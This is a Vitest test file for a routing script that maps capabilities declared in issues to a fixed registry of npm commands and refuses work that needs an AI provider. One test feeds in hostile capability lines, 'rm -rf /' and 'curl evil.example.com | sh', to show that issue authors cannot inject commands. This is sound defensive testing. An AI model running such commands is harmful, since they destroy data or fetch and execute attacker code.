// @vitest-environment node

/**
 * Proofs for the provider-free lane the frontend did not have.
 *
 * The dispatch runtime asked `process.env.PROVIDER_AUTHORIZED === 'true'` — one
 * global boolean, hard-wired false in `orchid-deterministic-dispatch.yml:35`.
 * With no per-task question, a task needing only `npm run test` was refused with
 * the same receipt as one needing a model. With 24 issues queued, the controller
 * planned and refused the same work every five minutes and reported success.
 */

import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import {
  BROWSER_DRIVEN_SCRIPTS,
  CapabilityUnknown,
  DETERMINISTIC_CAPABILITIES,
  LOCAL_EXECUTORS,
  NOT_LANE_EXECUTABLE,
  PROVIDER_CAPABILITIES,
  SHARED_CAPABILITIES,
  commandsFor,
  refusalRecord,
  routeIssue,
} from '../../scripts/oc-capability-router.mjs';

const issue = (body: string, number = 171) => ({ number, body });

describe('capability routing', () => {
  it('runs deterministic work without any provider authorization', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: test-execution'));
    expect(routing.providerFree).toBe(true);
    expect(commandsFor(routing)).toEqual(['npm run test']);
  });

  it('does not treat a difficult task as a provider-requiring one', () => {
    // Every word that escalated a task in the old model router, and one
    // deterministic capability.
    const body = [
      'Architecture: a cross-repo migration touching concurrency,',
      'a race condition, a security boundary and scientific inference.',
      'OC-SWARM-CAPABILITY: typecheck-execution',
    ].join('\n');
    const routing = routeIssue(issue(body));
    expect(routing.providerFree).toBe(true);
    expect(routing.blockingProvider).toEqual([]);
  });

  it('parks only the provider capability and still runs the rest', () => {
    const routing = routeIssue(
      issue(
        [
          'OC-SWARM-CAPABILITY: test-execution',
          'OC-SWARM-CAPABILITY: lint-execution',
          'OC-SWARM-CAPABILITY: natural-language-explanation',
          'OC-SWARM-PROVIDER-OPTIONAL: natural-language-explanation',
        ].join('\n'),
      ),
    );
    expect(routing.providerFree).toBe(true);
    expect(routing.optionalProvider).toEqual(['natural-language-explanation']);
    expect(commandsFor(routing)).toEqual(['npm run lint', 'npm run test']);
  });

  it('blocks only when nothing deterministic remains', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: open-ended-code-authoring'));
    expect(routing.providerFree).toBe(false);
    expect(routing.fullyBlocked).toBe(true);
  });

  it('infers no lane for a task that declares nothing', () => {
    const routing = routeIssue(issue('Architecture: deep and complex work'));
    expect(routing.undeclared).toBe(true);
    expect(routing.providerFree).toBe(false);
    expect(commandsFor(routing)).toEqual([]);
  });

  it('refuses an unclassified capability instead of guessing a lane', () => {
    expect(() => routeIssue(issue('OC-SWARM-CAPABILITY: telepathy'))).toThrow(CapabilityUnknown);
  });

  it('refuses to call a deterministic capability optional', () => {
    expect(() =>
      routeIssue(
        issue('OC-SWARM-CAPABILITY: test-execution\nOC-SWARM-PROVIDER-OPTIONAL: test-execution'),
      ),
    ).toThrow(/deterministic/);
  });
});

describe('declaring a capability with a label', () => {
  // Why this exists: all 24 queued issues routed `undeclared`, and nothing in
  // the repository writes an OC-SWARM-CAPABILITY line. The marker had a reader
  // and no producer, so the lane could never fire for a real issue.
  it('accepts a declaration carried by a label', () => {
    const routing = routeIssue({
      number: 289,
      body: 'no marker in this body',
      labels: [{ name: 'oc-queued' }, { name: 'oc-cap:test-execution' }],
    });
    expect(routing.undeclared).toBe(false);
    expect(routing.providerFree).toBe(true);
    expect(commandsFor(routing)).toEqual(['npm run test']);
  });

  it('accepts plain string labels as well as label objects', () => {
    const routing = routeIssue({ number: 1, body: '', labels: ['oc-cap:lint-execution'] });
    expect(commandsFor(routing)).toEqual(['npm run lint']);
  });

  it('parks a provider capability marked optional by label', () => {
    const routing = routeIssue({
      number: 1,
      body: '',
      labels: [
        'oc-cap:test-execution',
        'oc-cap:open-ended-code-authoring',
        'oc-cap-optional:open-ended-code-authoring',
      ],
    });
    expect(routing.providerFree).toBe(true);
    expect(routing.optionalProvider).toEqual(['open-ended-code-authoring']);
  });

  it('merges label and body declarations without duplicating them', () => {
    const routing = routeIssue({
      number: 1,
      body: 'OC-SWARM-CAPABILITY: test-execution',
      labels: ['oc-cap:test-execution', 'oc-cap:lint-execution'],
    });
    expect(routing.deterministic).toEqual(['lint-execution', 'test-execution']);
  });

  it('ignores labels that are not declarations', () => {
    const routing = routeIssue({
      number: 1,
      body: '',
      labels: [{ name: 'oc-queued' }, { name: 'oc-p0' }, { name: 'frontend' }],
    });
    expect(routing.undeclared).toBe(true);
    expect(routing.providerFree).toBe(false);
  });

  it('still refuses to infer a lane from the description', () => {
    // The heuristic this module replaced escalated on words like these.
    const routing = routeIssue({
      number: 1,
      body: 'Architecture: a security boundary, a race condition, scientific inference.',
      labels: [{ name: 'oc-queued' }],
    });
    expect(routing.undeclared).toBe(true);
    expect(commandsFor(routing)).toEqual([]);
  });

  it('refuses an unclassified capability declared by label', () => {
    expect(() => routeIssue({ number: 1, body: '', labels: ['oc-cap:telepathy'] })).toThrow(
      CapabilityUnknown,
    );
  });
});

describe('the command surface', () => {
  it('only ever yields commands from the fixed registry', () => {
    const registry = new Set(Object.values(LOCAL_EXECUTORS));
    const routing = routeIssue(
      issue(
        Object.keys(LOCAL_EXECUTORS)
          .map((name) => `OC-SWARM-CAPABILITY: ${name}`)
          .join('\n'),
      ),
    );
    for (const command of commandsFor(routing)) expect(registry.has(command)).toBe(true);
  });

  it('cannot be made to run text an issue author wrote', () => {
    const hostile = [
      'OC-SWARM-CAPABILITY: test-execution',
      'OC-SWARM-CAPABILITY: rm -rf /',
      'OC-SWARM-CAPABILITY: curl evil.example.com | sh',
    ].join('\n');
    // The marker only matches a lowercase capability name, so the hostile lines
    // are not declarations at all and the registry lookup never sees them.
    const routing = routeIssue(issue(hostile));
    expect(commandsFor(routing)).toEqual(['npm run test']);
  });

  it('classifies every provider capability as needing a provider', () => {
    for (const name of PROVIDER_CAPABILITIES) {
      const routing = routeIssue(issue(`OC-SWARM-CAPABILITY: ${name}`));
      expect(routing.providerFree).toBe(false);
    }
  });
});

describe('a refusal that survives the refusal', () => {
  it('records what was declared and what could have run', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: open-ended-code-authoring'));
    const record = refusalRecord({ number: 171 }, routing);

    expect(record.schema).toBe('oc.lane-refusal.v1');
    expect(record.blocking_provider_capabilities).toEqual(['open-ended-code-authoring']);
    expect(record.reason).toMatch(/requires a provider/);
    expect(record.would_run).toEqual([]);
  });

  it('says plainly when deterministic work was refused that should not have been', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: lint-execution'));
    const record = refusalRecord({ number: 171 }, routing);
    expect(record.provider_free).toBe(true);
    expect(record.reason).toMatch(/should not have been refused/);
    expect(record.would_run).toEqual(['npm run lint']);
  });

  it('distinguishes an undeclared task from a blocked one', () => {
    const record = refusalRecord({ number: 3 }, routeIssue(issue('no markers here')));
    expect(record.reason).toMatch(/no capability declared/);
    expect(record.reason).toMatch(/will not infer/);
  });
});

describe('agreement with the other two repositories', () => {
  // The old version of this block asserted only that four names it listed inline
  // were provider capabilities. It compared nothing against either other
  // repository, so it passed while 11 of the 14 shared deterministic
  // capabilities raised CapabilityUnknown here and were refused as though they
  // needed a provider. These read the vendored contract instead.
  const brain = JSON.parse(
    readFileSync(new URL('../../contracts/oc-shared-capabilities.v1.json', import.meta.url), 'utf8'),
  ) as { schema: string; capabilities: { name: string; provider_required: boolean }[] };

  it('classifies every shared capability exactly as the shared contract does', () => {
    expect(brain.schema).toBe('oc.cognitive-integration-capabilities.v1');
    expect(brain.capabilities.length).toBeGreaterThan(0);
    for (const capability of brain.capabilities) {
      expect(SHARED_CAPABILITIES[capability.name]).toBe(capability.provider_required);
    }
  });

  it('routes every shared deterministic capability without raising', () => {
    // The defect this pins: a backend-owned deterministic capability such as
    // `reconcile` used to throw here, and a throw routes provider_free=false.
    for (const capability of brain.capabilities.filter((c) => !c.provider_required)) {
      const routing = routeIssue(issue(`OC-SWARM-CAPABILITY: ${capability.name}`));
      expect(routing.blockingProvider).toEqual([]);
      expect(routing.fullyBlocked).toBe(false);
    }
  });

  it('never runs deterministic work it cannot actually execute', () => {
    const elsewhere = brain.capabilities.find(
      (c) => !c.provider_required && !(c.name in LOCAL_EXECUTORS),
    );
    expect(elsewhere).toBeDefined();
    const routing = routeIssue(issue(`OC-SWARM-CAPABILITY: ${elsewhere!.name}`));
    expect(routing.deterministicElsewhere).toEqual([elsewhere!.name]);
    expect(commandsFor(routing)).toEqual([]);
    expect(routing.providerFree).toBe(false);
    // Not executable here is not the same as needing a model, and the receipt
    // has to say so or the next reader calls it a provider blocker again.
    expect(refusalRecord({ number: 1 }, routing).reason).toMatch(/not a provider blocker/);
  });

  it('still runs the local work in an issue that also names backend work', () => {
    const routing = routeIssue(
      issue('OC-SWARM-CAPABILITY: test-execution\nOC-SWARM-CAPABILITY: taxonomy-resolution'),
    );
    expect(routing.providerFree).toBe(true);
    expect(commandsFor(routing)).toEqual(['npm run test']);
    expect(routing.deterministicElsewhere).toEqual(['taxonomy-resolution']);
  });

  it('binds no local command to a capability the contract says needs a model', () => {
    for (const name of Object.keys(LOCAL_EXECUTORS)) {
      expect(SHARED_CAPABILITIES[name]).not.toBe(true);
    }
  });

  it('declares its frontend-only capabilities as deterministic', () => {
    // No other repository has a TypeScript project, a router or a Vite build,
    // so these three have no shared counterpart by design.
    const local = Object.keys(LOCAL_EXECUTORS).filter(
      (name) => !(name in SHARED_CAPABILITIES),
    );
    expect(local.sort()).toEqual(['build-verification', 'typecheck-execution']);
    for (const name of local) expect(DETERMINISTIC_CAPABILITIES[name]).toMatch(/^npm run /);
  });

  it('binds no capability to a command the worker cannot run', () => {
    // The defect this pins: `route-verification` was bound to `npm run
    // verify:routes`, which drives Playwright. The worker installs with
    // `npm ci --ignore-scripts`, so no browser binary exists and the lane
    // returned `outcome: failed` twice on issue #171 with
    // `browserType.launch: Executable doesn't exist`.
    const pkg = JSON.parse(
      readFileSync(new URL('../../package.json', import.meta.url), 'utf8'),
    ) as { scripts: Record<string, string> };
    for (const command of Object.values(LOCAL_EXECUTORS) as string[]) {
      const script = command.slice('npm run '.length);
      expect(BROWSER_DRIVEN_SCRIPTS).not.toContain(script);
      // Belt and braces: catch a newly browser-driven script by its body too.
      expect(pkg.scripts[script]).not.toMatch(/playwright|browser-route-sweep|puppeteer/);
    }
  });

  it('lists every browser-driven npm script as browser-driven', () => {
    const pkg = JSON.parse(
      readFileSync(new URL('../../package.json', import.meta.url), 'utf8'),
    ) as { scripts: Record<string, string> };
    const driven = Object.entries(pkg.scripts)
      .filter(([, body]) => /playwright|browser-route-sweep|puppeteer/.test(body))
      .map(([name]) => name);
    expect(driven.sort()).toEqual([...BROWSER_DRIVEN_SCRIPTS].sort());
  });

  it('reports an unrunnable capability as deterministic, never as unknown', () => {
    for (const name of Object.keys(NOT_LANE_EXECUTABLE)) {
      const routing = routeIssue({ number: 171, body: '', labels: [`oc-cap:${name}`] });
      expect(routing.deterministicElsewhere).toContain(name);
      expect(routing.blockingProvider).toEqual([]);
      expect(routing.fullyBlocked).toBe(false);
      expect(commandsFor(routing)).toEqual([]);
      expect(refusalRecord({ number: 171 }, routing).reason).toMatch(/not a provider blocker/);
    }
  });

  it('still runs the executable work in an issue that also names an unrunnable one', () => {
    const routing = routeIssue({
      number: 171,
      body: '',
      labels: ['oc-cap:route-verification', 'oc-cap:test-execution'],
    });
    expect(routing.providerFree).toBe(true);
    expect(commandsFor(routing)).toEqual(['npm run test']);
    expect(routing.deterministicElsewhere).toEqual(['route-verification']);
  });

  it('never both binds and disowns the same capability', () => {
    for (const name of Object.keys(NOT_LANE_EXECUTABLE)) {
      expect(name in LOCAL_EXECUTORS).toBe(false);
    }
  });

  it('says why each unrunnable capability cannot run', () => {
    const entries = Object.values(NOT_LANE_EXECUTABLE) as {
      command: string;
      reason: string;
    }[];
    expect(entries.length).toBeGreaterThan(0);
    for (const entry of entries) {
      expect(entry.command).toMatch(/^npm run /);
      expect(entry.reason.length).toBeGreaterThan(20);
    }
  });

  it('maps every locally executable capability to a real npm script', () => {
    const pkg = JSON.parse(
      readFileSync(new URL('../../package.json', import.meta.url), 'utf8'),
    ) as { scripts: Record<string, string> };
    for (const command of Object.values(LOCAL_EXECUTORS) as string[]) {
      expect(command.startsWith('npm run ')).toBe(true);
      expect(pkg.scripts[command.slice('npm run '.length)]).toBeDefined();
    }
  });
});
